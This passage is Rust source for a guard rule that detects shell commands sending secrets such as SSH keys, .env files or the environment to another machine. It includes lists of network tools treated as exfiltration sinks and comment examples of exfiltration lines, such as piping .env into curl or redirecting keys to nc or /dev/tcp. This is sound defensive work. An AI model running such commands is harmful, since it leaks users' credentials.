//! The rule about secrets leaving the machine: a key, a credential, an
//! `.env` file or the environment sent to another machine, by an upload, a
//! copy to a remote destination, or a pipeline that ends in a program that
//! sends its input.
//!
//! A secret is a file the path model calls sensitive (`~/.ssh`, `~/.aws`),
//! an `.env` file anywhere, or the whole environment. Reading one on this
//! machine is nothing; only sending it is.

use std::collections::{HashMap, HashSet};
use std::ops::Range;

use milo_guards_core::spelling::glob;
use milo_guards_core::{Flavour, Sensitivity};

use super::files::remote;
use super::Checker;
use crate::path::{Access, Place};
use crate::unit::{has_flag, operands, referenced, referenced_in, Arg, Stage, Unit};
use crate::{Rule, Shell};

const ENVIRONMENT: &str = "your environment variables";
const DOTENV: &str = "an .env file";
const HOME: &str = "your home directory";
/// What core calls the root of a disk, which holds the home directory.
const ROOT: &str = "the root of the disk";

/// The ends of an `.env` file's name that make it a template, committed
/// with the code: `.env.example`.
const TEMPLATES: [&str; 4] = ["example", "sample", "template", "dist"];

/// Programs that send what they are given to another machine, so a secret
/// in their arguments, in a substitution they run or in a variable they
/// read has left.
const NETWORK: &[&str] = &[
    "curl",
    "wget",
    "fetch",
    "http",
    "https",
    "xh",
    "aria2c",
    "invoke-webrequest",
    "invoke-restmethod",
    "start-bitstransfer",
    "send-mailmessage",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "telnet",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "rclone",
    "sshpass",
    "mosh",
    "mail",
    "mailx",
    "sendmail",
    "msmtp",
    "mutt",
];

/// Programs that send their input as they get it.
const SINKS: &[&str] = &[
    "nc",
    "ncat",
    "netcat",
    "socat",
    "telnet",
    "ssh",
    "sshpass",
    "mosh",
    "mail",
    "mailx",
    "sendmail",
    "msmtp",
    "mutt",
    "invoke-webrequest",
    "invoke-restmethod",
    "send-mailmessage",
];

/// Programs beside [`NETWORK`] and [`SINKS`] that this rule sends with: the
/// cloud copiers, which copy to a bucket, and a TLS client, which sends its
/// input.
const COPIERS: &[&str] = &["aws", "gsutil", "openssl"];

/// Programs that name a key or a certificate they use to log in, which they
/// do not send: `ssh -i ~/.ssh/id_ed25519 host`.
const KEY_USERS: &[&str] = &[
    "ssh", "scp", "sftp", "rsync", "curl", "wget", "http", "https", "xh", "git", "sshpass", "mosh",
    "rclone",
];

/// The options of those programs whose value is such a file.
const LOGIN_OPTIONS: &[&str] = &[
    "-i",
    "-F",
    "-o",
    "-E",
    "-K",
    "--key",
    "--cert",
    "--cacert",
    "--identity-file",
    "--netrc-file",
    "--config",
];

/// `curl`'s short options that take a value and send none of it from a file.
const CURL_VALUES: &str = "AbcCDeEKmoPQrtuUwxXyYz";

/// The options that take a value, for each program that copies to another
/// machine, so a value is not read as a file to send.
const SCP_VALUES: [&str; 9] = ["-c", "-D", "-F", "-i", "-J", "-l", "-o", "-P", "-S"];
const SFTP_VALUES: [&str; 13] = [
    "-B", "-b", "-c", "-D", "-F", "-i", "-J", "-l", "-o", "-P", "-R", "-S", "-s",
];
const RSYNC_VALUES: [&str; 25] = [
    "-e",
    "--rsh",
    "--exclude",
    "--include",
    "--filter",
    "-f",
    "--files-from",
    "--exclude-from",
    "--include-from",
    "--log-file",
    "--password-file",
    "--port",
    "--backup-dir",
    "--suffix",
    "-T",
    "--temp-dir",
    "--chmod",
    "--chown",
    "--compare-dest",
    "--copy-dest",
    "--link-dest",
    "--partial-dir",
    "--timeout",
    "--bwlimit",
    "-M",
];
const CLOUD_VALUES: [&str; 31] = [
    "--exclude",
    "--include",
    "--filter",
    "--exclude-from",
    "--include-from",
    "--filter-from",
    "--files-from",
    "--config",
    "--profile",
    "--region",
    "--endpoint-url",
    "--acl",
    "--storage-class",
    "--sse",
    "--sse-kms-key-id",
    "--cache-control",
    "--content-type",
    "--content-encoding",
    "--metadata",
    "--bwlimit",
    "--transfers",
    "--checkers",
    "--retries",
    "--log-file",
    "--log-level",
    "--backup-dir",
    "--suffix",
    "--max-age",
    "--min-age",
    "--max-size",
    "--min-size",
];
const GSUTIL_VALUES: [&str; 3] = ["-h", "-o", "-x"];

/// A secret found, as a reason says it and as the line wrote it.
#[derive(Debug, Clone)]
struct Hit {
    words: &'static str,
    target: String,
}

/// Where the line reads secrets, and where what it reads goes, by unit
/// (an index in the split).
#[derive(Debug, Default)]
pub(super) struct Flow {
    /// Whether the line has a unit that can send anything. When none can,
    /// nothing is followed and nothing is sent.
    active: bool,
    /// A secret the unit itself reads: an argument that names one, the
    /// environment, a variable that holds one, a file redirected onto it.
    own: Vec<Option<Hit>>,
    /// A secret read for the unit: in a substitution, a here-document or a
    /// variable among its arguments.
    fed: Vec<Option<Hit>>,
    /// A secret redirected onto its input (`nc host 1 < ~/.ssh/id`).
    stdin: Vec<Option<Hit>>,
    /// Units whose output a redirect sends to the network
    /// (`> /dev/tcp/host/1`).
    to_network: Vec<bool>,
    /// Where each unit stands in a pipeline: its own stage, or the one of the
    /// command whose script, substitution or `-exec` it runs for.
    stage_of: Vec<Option<Stage>>,
    /// For each pipeline, the first stage that reads a secret. A secret read
    /// in a pipeline that runs in a stage of another counts for that stage.
    stage: HashMap<usize, (usize, Hit)>,
    /// The stage of an outer pipeline that a pipeline runs in.
    parent: HashMap<usize, Stage>,
}

impl Flow {
    fn own(&self, at: usize) -> Option<&Hit> {
        self.own.get(at).and_then(Option::as_ref)
    }

    fn fed(&self, at: usize) -> Option<&Hit> {
        self.fed.get(at).and_then(Option::as_ref)
    }

    fn stdin(&self, at: usize) -> Option<&Hit> {
        self.stdin.get(at).and_then(Option::as_ref)
    }

    fn stage_of(&self, at: usize) -> Option<Stage> {
        self.stage_of.get(at).copied().flatten()
    }

    /// The secret an earlier stage of the pipeline `stage` is in reads, or
    /// of a pipeline that one runs in, and so on outwards: what a unit at
    /// `stage` is handed.
    fn piped(&self, mut stage: Stage) -> Option<&Hit> {
        loop {
            let read = self
                .stage
                .get(&stage.pipeline)
                .filter(|(first, _)| *first < stage.index);
            if let Some((_, hit)) = read {
                return Some(hit);
            }
            stage = *self.parent.get(&stage.pipeline)?;
        }
    }
}

impl Checker<'_> {
    /// Follow every secret the line reads: which units read one, and which
    /// are handed one.
    pub(super) fn trace(&self) -> Flow {
        let units = &self.split.units;
        if !self.can_send() {
            return Flow::default();
        }
        let mut flow = Flow {
            active: true,
            parent: self.split.parents.clone(),
            own: vec![None; units.len()],
            fed: vec![None; units.len()],
            stdin: vec![None; units.len()],
            to_network: vec![false; units.len()],
            stage_of: units.iter().map(|unit| unit.stage).collect(),
            ..Flow::default()
        };
        // Outer commands were noted last, and hand their place down first.
        for nested in self.split.nested.iter().rev() {
            let outer = nested
                .command
                .clone()
                .find_map(|at| flow.stage_of.get(at).copied().flatten());
            if let Some(outer) = outer {
                for at in nested.inside.clone() {
                    if let Some(slot) = flow.stage_of.get_mut(at).filter(|slot| slot.is_none()) {
                        *slot = Some(outer);
                    }
                }
            }
        }
        // A pipeline inside a command that is a stage of another runs in that
        // stage: the nearest command that holds it says which.
        for nested in &self.split.nested {
            let outer = nested
                .command
                .clone()
                .find_map(|at| flow.stage_of.get(at).copied().flatten());
            let Some(outer) = outer else { continue };
            for at in nested.inside.clone() {
                let inner = units.get(at).and_then(|unit| unit.stage);
                if let Some(inner) = inner.filter(|inner| inner.pipeline > outer.pipeline) {
                    flow.parent.entry(inner.pipeline).or_insert(outer);
                }
            }
        }
        // A redirect opens before its units run: its target is read once,
        // from where its first unit starts, and the hit goes to them all.
        for redirect in self
            .split
            .redirects
            .iter()
            .filter(|redirect| !redirect.text)
        {
            let Some(first) = units.get(redirect.units.start) else {
                continue;
            };
            if redirect.input {
                let Some(hit) = self.secret(first, &redirect.target, false, true) else {
                    continue;
                };
                for at in redirect.units.clone() {
                    if let Some(slot) = flow.stdin.get_mut(at).filter(|slot| slot.is_none()) {
                        *slot = Some(hit.clone());
                    }
                }
            } else if redirect.target.known().is_some_and(network_device) {
                for at in redirect.units.clone() {
                    if let Some(slot) = flow.to_network.get_mut(at) {
                        *slot = true;
                    }
                }
            }
        }
        for (at, unit) in units.iter().enumerate() {
            let own = self.secret_read(unit, flow.stdin(at));
            if let Some(slot) = flow.own.get_mut(at) {
                *slot = own;
            }
        }
        // A variable set from what a secret-reading command prints holds
        // the secret, and so does one set from that.
        let held = self.held(&flow);
        for (at, unit) in units.iter().enumerate() {
            if let Some(hit) = mentions(unit, &held) {
                if let Some(slot) = flow.fed.get_mut(at) {
                    *slot = Some(hit.clone());
                }
                if let Some(slot) = flow.own.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit);
                }
            }
        }
        // A here-string or here-document that expands one is its input.
        for redirect in self.split.redirects.iter().filter(|redirect| redirect.text) {
            let Some(hit) = text_mentions(redirect.target.text(), Shell::Posix, &held) else {
                continue;
            };
            for at in redirect.units.clone() {
                if let Some(slot) = flow.stdin.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit.clone());
                }
                if let Some(slot) = flow.own.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit.clone());
                }
            }
        }
        for nested in &self.split.nested {
            let hit = nested.inside.clone().find_map(|at| flow.own(at).cloned());
            if let Some(hit) = hit {
                for at in nested.command.clone() {
                    if let Some(slot) = flow.fed.get_mut(at).filter(|slot| slot.is_none()) {
                        *slot = Some(hit.clone());
                    }
                }
            }
        }
        for at in 0..units.len() {
            let (Some(stage), Some(hit)) = (flow.stage_of(at), flow.own(at).or(flow.fed(at)))
            else {
                continue;
            };
            let hit = hit.clone();
            // From the stage up through the stages of the pipelines it runs
            // in, while this is the earliest read: an outer pipeline's
            // entry is set once for each inner one, so what an earlier
            // read already set is as far as the walk needs to go.
            let mut stage = stage;
            loop {
                let first = flow
                    .stage
                    .get(&stage.pipeline)
                    .is_none_or(|(first, _)| stage.index < *first);
                if !first {
                    break;
                }
                flow.stage
                    .insert(stage.pipeline, (stage.index, hit.clone()));
                match flow.parent.get(&stage.pipeline) {
                    Some(outer) => stage = *outer,
                    None => break,
                }
            }
        }
        // A substitution, process substitution or script in a command runs
        // with the command's input: `cat .env | curl -d "$(cat)" url`. So the
        // command is handed what the stages before its own read.
        for nested in &self.split.nested {
            for at in nested.command.clone() {
                let Some(hit) = flow.stage_of(at).and_then(|stage| flow.piped(stage)) else {
                    continue;
                };
                let hit = hit.clone();
                if let Some(slot) = flow.fed.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit);
                }
            }
        }
        flow
    }

    /// Whether any unit of the line can send something away: it runs a
    /// program this rule sends with, or a redirect opens a connection. Then
    /// no secret it reads goes anywhere, and following them is skipped.
    fn can_send(&self) -> bool {
        let program = self.split.units.iter().any(|unit| {
            unit.key().is_some_and(|key| {
                let key = key.as_str();
                NETWORK.contains(&key) || SINKS.contains(&key) || COPIERS.contains(&key)
            })
        });
        program
            || self.split.redirects.iter().any(|redirect| {
                !redirect.text
                    && !redirect.input
                    && redirect.target.known().is_some_and(network_device)
            })
    }

    /// The variables that hold a secret, by name: one set from a command
    /// that reads a secret, or from a variable that holds one. Each name is
    /// settled once, from the variables read to set it, whatever the order
    /// the line sets them in (a loop or a function runs them again).
    fn held(&self, flow: &Flow) -> HashMap<String, Hit> {
        let units = &self.split.units;
        let assigned = &self.split.assigned;
        // The names a unit reads in its arguments.
        let mut reads: Vec<Vec<String>> = vec![Vec::new(); units.len()];
        for (at, unit) in units.iter().enumerate() {
            if let Some(names) = reads.get_mut(at) {
                names.extend(
                    unit.args
                        .iter()
                        .filter(|arg| arg.is_unknown())
                        .flat_map(|arg| referenced_in(arg.text(), unit.shell)),
                );
            }
        }
        // The names a here-string or here-document reads, once for each, and
        // the units it feeds as a range: not copied into every one of them.
        let mut fed_names: HashMap<String, Vec<&Range<usize>>> = HashMap::new();
        for redirect in self.split.redirects.iter().filter(|redirect| redirect.text) {
            let names: HashSet<String> = referenced(redirect.target.text()).into_iter().collect();
            for name in names {
                fed_names.entry(name).or_default().push(&redirect.units);
            }
        }
        let mut readers: HashMap<&str, Vec<usize>> = HashMap::new();
        let mut work: Vec<(usize, Hit)> = Vec::new();
        // Each assignment is handed work once: a name is settled by the
        // first, and whoever reads it is told then.
        let mut queued = vec![false; assigned.len()];
        for (at, one) in assigned.iter().enumerate() {
            let direct = one.inside.clone().find_map(|unit| flow.own(unit).cloned());
            if let Some(hit) = direct {
                queued[at] = true;
                work.push((at, hit));
            }
            let inside = one.inside.clone().filter_map(|unit| reads.get(unit));
            for name in inside.flatten().chain(&one.uses) {
                readers.entry(name).or_default().push(at);
            }
        }
        let mut held: HashMap<String, Hit> = HashMap::new();
        while let Some((at, hit)) = work.pop() {
            let Some(one) = assigned.get(at) else {
                continue;
            };
            if held.contains_key(&one.name) {
                continue;
            }
            held.insert(one.name.clone(), hit.clone());
            let in_arguments = readers.get(one.name.as_str()).into_iter().flatten();
            // An assignment reads what a here-document feeds any unit in its
            // value.
            let in_text = fed_names
                .get(one.name.as_str())
                .into_iter()
                .flatten()
                .flat_map(|fed| {
                    assigned.iter().enumerate().filter(move |(_, other)| {
                        other.inside.start < fed.end
                            && fed.start < other.inside.end
                            && other.inside.start < other.inside.end
                    })
                })
                .map(|(reader, _)| reader);
            for reader in in_arguments.copied().chain(in_text) {
                if let Some(slot) = queued.get_mut(reader).filter(|slot| !**slot) {
                    *slot = true;
                    work.push((reader, hit.clone()));
                }
            }
        }
        held
    }

    /// A secret the unit itself reads: the environment, a file it is given
    /// or has on its input.
    fn secret_read(&self, unit: &Unit, stdin: Option<&Hit>) -> Option<Hit> {
        let named = super::named(unit);
        let unit: &Unit = &named;
        let key = unit.key()?;
        // They print or list keys the machine holds, which are public.
        if matches!(key.as_str(), "ssh-keygen" | "ssh-add") {
            return None;
        }
        if dumps_environment(unit, &key) {
            return Some(Hit {
                words: ENVIRONMENT,
                target: key,
            });
        }
        candidates(unit, &key)
            .iter()
            .find_map(|arg| self.secret(unit, arg, false, true))
            .or_else(|| stdin.cloned())
    }

    /// The secret `arg` names, when it names one: `home` also counts the
    /// home directory itself and any folder holding it, which hold them, for
    /// what copies a folder. `glob` says whether the shell expands a wildcard
    /// in it: it does for a word of its own, not for a part of one (`@f`).
    fn secret(&self, unit: &Unit, arg: &Arg, home: bool, glob: bool) -> Option<Hit> {
        let name = super::named_in_unknown_folder(arg);
        let arg = name.as_ref().unwrap_or(arg);
        let text = arg.known().filter(|text| *text != "-")?;
        // A wildcard in the name of a file the shell does not expand is a
        // letter: it names no secret.
        let named = text.rsplit(['/', '\\']).next().unwrap_or(text);
        if !glob && glob::has_wildcard(named) {
            return None;
        }
        let words = if is_environ(text) {
            ENVIRONMENT
        } else if dotenv(text, unit.shell, unit.hidden, glob) {
            DOTENV
        } else if public_key(text) {
            return None;
        } else {
            match self.place(unit.shell, unit.scope(), arg, Access::Item) {
                Place::Sensitive(words, Sensitivity::Secret) => words,
                Place::Home { .. } if home => HOME,
                Place::Top(ROOT) if home => HOME,
                _ => return None,
            }
        };
        Some(Hit {
            words,
            target: text.to_string(),
        })
    }

    fn sent(&mut self, hit: &Hit) {
        self.add(
            Rule::SendSecret,
            format!("sends {} off the machine", hit.words),
            Some(&Arg::Known(hit.target.clone())),
        );
    }

    /// Sending a secret: an upload that names a file, a copy to another
    /// machine, a program that sends what it is piped or redirected, and a
    /// sender handed one by a substitution.
    pub(super) fn send(&mut self, at: usize, unit: &Unit, key: &str) {
        if !self.flow.active {
            return;
        }
        // A file named under a folder only known when it runs is sent by
        // its name (`curl -T "$PWD/.env"`).
        let named = super::named(unit);
        let unit: &Unit = &named;
        for file in uploads(unit, key) {
            if let Some(hit) = self.secret(unit, &file.arg, false, file.word) {
                self.sent(&hit);
            }
        }
        self.copy(unit, key);
        let network = NETWORK.contains(&key);
        let to_network = self.flow.to_network.get(at).copied().unwrap_or(false);
        let sink =
            takes_input(unit, key) || to_network || (network && unit.args.contains(&Arg::Input));
        if sink {
            let piped = self
                .flow
                .stage_of(at)
                .and_then(|stage| self.flow.piped(stage));
            let own = if to_network {
                self.flow.own(at).or(self.flow.fed(at))
            } else {
                None
            };
            let hit = piped.or(self.flow.stdin(at)).or(own).cloned();
            if let Some(hit) = hit {
                self.sent(&hit);
            }
        }
        if network {
            if let Some(hit) = self.flow.fed(at).cloned() {
                self.sent(&hit);
            }
        }
    }

    /// `scp`, `rsync`, `sftp`, `rclone` and the cloud copiers given a
    /// destination on another machine: what they take from here goes.
    fn copy(&mut self, unit: &Unit, key: &str) {
        let values: &[&str] = match key {
            "scp" => &SCP_VALUES,
            "sftp" => &SFTP_VALUES,
            "rsync" => &RSYNC_VALUES,
            "rclone" | "aws" => &CLOUD_VALUES,
            "gsutil" => &GSUTIL_VALUES,
            _ => return,
        };
        let all = operands(&unit.args, values);
        let verb = |at: usize, verbs: &[&str]| {
            all.get(at)
                .and_then(|arg| arg.known())
                .is_some_and(|word| verbs.contains(&word))
        };
        let skip = match key {
            "rclone" if verb(0, &["copy", "sync", "move", "copyto", "moveto", "bisync"]) => 1,
            "aws" if verb(0, &["s3"]) && verb(1, &["cp", "mv", "sync"]) => 2,
            "gsutil" if verb(0, &["cp", "mv", "rsync"]) => 1,
            "scp" | "sftp" | "rsync" => 0,
            _ => return,
        };
        let Some((destination, sources)) = all.get(skip..).and_then(<[&Arg]>::split_last) else {
            return;
        };
        if !to_other_machine(destination, matches!(key, "scp" | "sftp")) {
            return;
        }
        for source in sources {
            if to_other_machine(source, false) {
                continue;
            }
            if let Some(hit) = self.secret(unit, source, true, true) {
                self.sent(&hit);
            }
        }
    }
}

/// A secret a variable the unit's arguments mention holds.
fn mentions(unit: &Unit, held: &HashMap<String, Hit>) -> Option<Hit> {
    unit.args
        .iter()
        .filter(|arg| arg.is_unknown())
        .find_map(|arg| text_mentions(arg.text(), unit.shell, held))
}

/// A secret a variable `text`, an expansion the guard cannot resolve,
/// names holds: `$k`, `"$k"`, `${k}`, but not `$key`. PowerShell's names
/// are read as it reads them (`$K` and `$script:k` are `$k`).
fn text_mentions(text: &str, shell: Shell, held: &HashMap<String, Hit>) -> Option<Hit> {
    if held.is_empty() {
        return None;
    }
    referenced_in(text, shell)
        .iter()
        .find_map(|name| held.get(name).cloned())
}

/// Whether the path is a network connection bash opens in its own
/// redirects (`> /dev/tcp/host/1`); a program that opens it as a path finds
/// no such file.
fn network_device(text: &str) -> bool {
    text.starts_with("/dev/tcp/") || text.starts_with("/dev/udp/")
}

/// Whether `arg` is on another machine: `host:path`, a URL, a destination
/// only known when it runs that holds a colon, or (`unknown`) any
/// destination only known when it runs.
fn to_other_machine(arg: &Arg, unknown: bool) -> bool {
    match arg {
        Arg::Known(text) => {
            remote(arg)
                || text.contains("://")
                || text.starts_with(':')
                || (text.starts_with('[') && text.contains("]:"))
        }
        Arg::Unknown(_) | Arg::Template { .. } => unknown || arg.text().contains(':'),
        Arg::Input | Arg::Null => false,
    }
}

/// The arguments of `unit` that may name a file it reads, without the ones
/// that name a key it logs in with, and the value of each `name=value`.
fn candidates(unit: &Unit, key: &str) -> Vec<Arg> {
    let logs_in = KEY_USERS.contains(&key);
    let mut found = Vec::new();
    let mut iter = unit.args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        if logs_in {
            if LOGIN_OPTIONS.contains(&text) {
                iter.next();
                continue;
            }
            if text
                .split_once('=')
                .is_some_and(|(option, _)| LOGIN_OPTIONS.contains(&option))
            {
                continue;
            }
        }
        found.push(arg.clone());
        if let Some((_, value)) = text.split_once('=').filter(|(_, value)| !value.is_empty()) {
            found.push(Arg::Known(value.to_string()));
        }
    }
    found
}

/// Whether `unit` prints the whole environment: `env`, `printenv`, `set`,
/// `export -p`, `declare -x`, PowerShell's `Get-ChildItem env:`.
fn dumps_environment(unit: &Unit, key: &str) -> bool {
    let args = unit.args.as_slice();
    let none = operands(args, &[]).is_empty();
    match (unit.shell, key) {
        (Shell::Posix, "env") => true,
        (Shell::Posix, "printenv") => none,
        (Shell::Posix, "set") => args.is_empty(),
        (Shell::Posix, "export") => none,
        (Shell::Posix, "declare" | "typeset") => {
            none && (has_flag(args, Some('p'), None) || has_flag(args, Some('x'), None))
        }
        // `env:`, `env:\`, `env:*`, and a wildcard that may match many
        // (`env:AWS*`).
        (Shell::PowerShell, "get-childitem" | "get-item") => args.iter().any(|arg| {
            arg.known().is_some_and(|text| {
                text.to_ascii_lowercase()
                    .strip_prefix("env:")
                    .is_some_and(|rest| {
                        let rest = rest.trim_matches(['\\', '/']);
                        rest.is_empty() || glob::has_wildcard(rest)
                    })
            })
        }),
        _ => false,
    }
}

/// `/proc/self/environ` and the like: the environment, as a file.
fn is_environ(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.starts_with("/proc/") && lower.ends_with("/environ")
}

/// A public key is meant to be shared.
fn public_key(text: &str) -> bool {
    text.to_ascii_lowercase().ends_with(".pub")
}

/// Whether `text` names an `.env` file (`.env`, `.env.local`,
/// `config/.env.production`) or, when the shell expands it (`glob`), a
/// pattern that can: not a folder, and not a template such as
/// `.env.example`.
fn dotenv(text: &str, shell: Shell, hidden: bool, glob: bool) -> bool {
    let windows = shell != Shell::Posix;
    let separators: &[char] = if windows { &['/', '\\'] } else { &['/'] };
    if text.ends_with(separators) {
        return false;
    }
    let name = text.rsplit(separators).next().unwrap_or(text);
    // Windows reads `.env.`, `.env ` and `.env:stream` as `.env`.
    let name = if windows {
        name.split(':')
            .next()
            .unwrap_or(name)
            .trim_end_matches(['.', ' '])
    } else {
        name
    };
    if glob::has_wildcard(name) {
        // A wildcard in a name the shell does not expand is a letter.
        if !glob {
            return false;
        }
        let flavour = if windows {
            Flavour::Windows
        } else {
            Flavour::Posix
        };
        return [".env", ".env.local"]
            .iter()
            .any(|file| glob::matches(name, file, flavour, hidden));
    }
    let lower = name.to_ascii_lowercase();
    match lower.strip_prefix(".env") {
        Some("") => true,
        Some(rest) => rest
            .strip_prefix('.')
            .is_some_and(|suffix| !TEMPLATES.contains(&suffix)),
        None => false,
    }
}

/// A file a unit uploads: `-` stands for its input.
struct Upload {
    arg: Arg,
    /// Whether it is a word of its own, which the shell expands when it is a
    /// pattern (`-T .env*`), and not a part of one (`-d @.env*`, where the
    /// pattern is the whole word and the program reads the name as written).
    word: bool,
}

/// The files a unit uploads, named in its own arguments.
fn uploads(unit: &Unit, key: &str) -> Vec<Upload> {
    match key {
        "curl" => curl_files(&unit.args),
        "wget" => wget_files(&unit.args),
        "http" | "https" | "xh" => unit
            .args
            .iter()
            .filter_map(Arg::known)
            .filter(|text| !text.starts_with('-'))
            .filter_map(item_file)
            .map(|file| named(file, false))
            .collect(),
        "invoke-webrequest" | "invoke-restmethod" => parameter(&unit.args, "infile")
            .into_iter()
            .map(|arg| Upload { arg, word: true })
            .collect(),
        "start-bitstransfer" => bits_files(&unit.args),
        // `-Attachments` takes a list of files and mails them.
        "send-mailmessage" => parameter_list(&unit.args, "attachments")
            .into_iter()
            .map(|arg| Upload { arg, word: true })
            .collect(),
        _ => Vec::new(),
    }
}

/// What `Start-BitsTransfer` uploads: its `-Source` files, when `-TransferType`
/// is `Upload`. A source given by position is the first word that is not an
/// option or an option's value.
fn bits_files(args: &[Arg]) -> Vec<Upload> {
    let upload = parameter(args, "transfertype").iter().any(|kind| {
        kind.known()
            .is_some_and(|kind| kind.to_ascii_lowercase().starts_with("upload"))
    });
    if !upload {
        return Vec::new();
    }
    let mut sources = parameter_list(args, "source");
    if sources.is_empty() {
        let first = args.iter().enumerate().find(|(at, arg)| {
            arg.known().is_none_or(|text| !text.starts_with('-'))
                && (*at == 0
                    || args
                        .get(*at - 1)
                        .and_then(Arg::known)
                        .is_none_or(|before| !takes_value(before, &BITS_SWITCHES)))
        });
        sources.extend(first.map(|(_, arg)| arg.clone()));
    }
    sources
        .into_iter()
        .map(|arg| Upload { arg, word: true })
        .collect()
}

/// The switches of `Start-BitsTransfer`, its own and the common ones: they
/// take no value, so the word after one is the source.
const BITS_SWITCHES: [&str; 6] = [
    "asynchronous",
    "suspended",
    "confirm",
    "whatif",
    "verbose",
    "debug",
];

/// Whether `word` is a PowerShell parameter that takes the next word as its
/// value: one that is not among `switches` (by its name or an abbreviation
/// of it), or any parameter bound to the next word by a colon
/// (`-Asynchronous:$true`).
fn takes_value(word: &str, switches: &[&str]) -> bool {
    let Some(param) = word.strip_prefix('-') else {
        return false;
    };
    if param.ends_with(':') {
        return true;
    }
    let param = param.to_ascii_lowercase();
    !(param.len() >= 2 && switches.iter().any(|switch| switch.starts_with(&param)))
}

/// A file named in text; a device that is the input is `-`.
fn named(text: &str, word: bool) -> Upload {
    let stdin = matches!(text, "/dev/stdin" | "/dev/fd/0");
    Upload {
        arg: Arg::Known(if stdin { "-" } else { text }.to_string()),
        word,
    }
}

/// What `curl` takes from a file: `-d @f` (also `--data`, `--data-binary`,
/// `--data-ascii`, `--json`), `--data-urlencode name@f`, `-F name=@f` or
/// `name=<f`, `-T f` and `-H @f`.
fn curl_files(args: &[Arg]) -> Vec<Upload> {
    let mut files = Vec::new();
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        // `attached` says the value is a part of the option's word.
        let mut take = |kind: char, value: Option<Arg>, attached: bool| {
            if let Some(Arg::Known(value)) = value {
                files.extend(curl_file(kind, &value, !attached));
            }
        };
        if let Some(long) = text.strip_prefix("--") {
            let (name, attached) = long
                .split_once('=')
                .map_or((long, None), |(name, value)| (name, Some(value)));
            let kind = match name {
                "data" | "data-binary" | "data-ascii" | "json" => 'd',
                "data-urlencode" => 'u',
                "form" => 'F',
                "upload-file" => 'T',
                "header" => 'H',
                _ => continue,
            };
            let value = match attached {
                Some(value) => Some(Arg::Known(value.to_string())),
                None => iter.next().cloned(),
            };
            take(kind, value, attached.is_some());
        } else if let Some(bundle) = text.strip_prefix('-') {
            for (at, letter) in bundle.char_indices() {
                let value = |rest: &str, iter: &mut std::slice::Iter<'_, Arg>| {
                    if rest.is_empty() {
                        iter.next().cloned()
                    } else {
                        Some(Arg::Known(rest.to_string()))
                    }
                };
                let rest = bundle.get(at + letter.len_utf8()..).unwrap_or_default();
                if matches!(letter, 'd' | 'F' | 'T' | 'H') {
                    take(letter, value(rest, &mut iter), !rest.is_empty());
                    break;
                }
                if CURL_VALUES.contains(letter) {
                    value(rest, &mut iter);
                    break;
                }
            }
        }
    }
    files
}

/// The files one `curl` option's value names, by the option's kind: `d`
/// data, `u` `--data-urlencode`, `F` a form field, `T` an upload, `H` a
/// header. Only `-T f` names its file as a word of its own (`word`).
fn curl_file(kind: char, value: &str, word: bool) -> Vec<Upload> {
    match kind {
        'd' | 'H' => value
            .strip_prefix('@')
            .map(|path| named(path, false))
            .into_iter()
            .collect(),
        'u' => value
            .split_once('@')
            .filter(|(name, _)| !name.contains('='))
            .map(|(_, path)| named(path, false))
            .into_iter()
            .collect(),
        'F' => value
            .split_once('=')
            .and_then(|(_, field)| field.strip_prefix('@').or_else(|| field.strip_prefix('<')))
            .map(|field| {
                field
                    .split(';')
                    .next()
                    .unwrap_or(field)
                    .split(',')
                    .map(|path| named(path, false))
                    .collect()
            })
            .unwrap_or_default(),
        // `-T .` uploads what is on the input.
        _ => vec![named(if value == "." { "-" } else { value }, word)],
    }
}

/// What `wget` posts from a file: `--post-file f`, `--body-file f`.
fn wget_files(args: &[Arg]) -> Vec<Upload> {
    let mut files = Vec::new();
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        let Some(long) = text.strip_prefix("--") else {
            continue;
        };
        let (name, attached) = long
            .split_once('=')
            .map_or((long, None), |(name, value)| (name, Some(value)));
        if !matches!(name, "post-file" | "body-file") {
            continue;
        }
        let value = match attached {
            Some(value) => Some(value),
            None => iter.next().and_then(Arg::known),
        };
        files.extend(value.map(|file| named(file, attached.is_none())));
    }
    files
}

/// The file a request item names for `http` and `xh`: `field@f` uploads it,
/// `field=@f` and `field:=@f` read it as a value, `@f` is the body.
fn item_file(text: &str) -> Option<&str> {
    if text.contains("://") {
        return None;
    }
    let (name, path) = text.split_once('@')?;
    let field = name
        .strip_suffix(":=")
        .or_else(|| name.strip_suffix('='))
        .unwrap_or(name);
    (!field.contains(['=', ':', '@', '/'])).then_some(path)
}

/// The values of a PowerShell parameter, by its name or an abbreviation
/// of it.
fn parameter(args: &[Arg], name: &str) -> Vec<Arg> {
    let mut values = Vec::new();
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(param) = arg.known().and_then(|text| text.strip_prefix('-')) else {
            continue;
        };
        let param = param.trim_end_matches(':').to_ascii_lowercase();
        if param.len() >= 2 && name.starts_with(&param) {
            values.extend(iter.next().cloned());
        }
    }
    values
}

/// The values of a PowerShell parameter that takes a list (`-Attachments a,b`,
/// which the split reads as `-Attachments a b`): the words after it, up to the
/// next parameter.
fn parameter_list(args: &[Arg], name: &str) -> Vec<Arg> {
    let mut values = Vec::new();
    let mut taking = false;
    for arg in args {
        match arg.known().and_then(|text| text.strip_prefix('-')) {
            Some(param) => {
                let param = param.trim_end_matches(':').to_ascii_lowercase();
                taking = param.len() >= 2 && name.starts_with(&param);
            }
            None if taking => values.push(arg.clone()),
            None => {}
        }
    }
    values
}

/// Whether `unit` sends its input on: a program that does whatever it is
/// given, or one given an option that reads its body from the input.
fn takes_input(unit: &Unit, key: &str) -> bool {
    let args = unit.args.as_slice();
    let stdin = |files: Vec<Upload>| files.iter().any(|file| file.arg.known() == Some("-"));
    match key {
        "curl" => stdin(curl_files(args)),
        "wget" => stdin(wget_files(args)),
        // They read a body from their input unless told not to.
        "http" | "https" | "xh" => {
            !has_flag(args, Some('I'), Some("ignore-stdin"))
                && !has_flag(args, None, Some("offline"))
        }
